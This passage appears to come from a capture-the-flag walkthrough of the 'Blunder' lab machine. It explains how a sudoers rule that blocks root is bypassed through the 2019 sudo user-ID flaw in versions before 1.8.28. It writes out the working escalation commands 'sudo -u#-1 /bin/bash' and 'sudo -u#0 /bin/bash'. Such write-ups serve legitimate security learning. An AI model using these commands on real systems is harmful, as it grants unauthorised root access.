User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

The configuration above is supposed to stop `sudo` as running as the root user. There was a public CVE release in November 2019 about how there were other ways to enter root besides `root` that got around this restriction. This impacts `sudo` versions before 1.8.28. I can see Blunder is running 1.8.25

```bash
sudo --version
```


```bash
sudo -u#0 /bin/bash
```

```bash
sudo -u#-1 /bin/bash
```
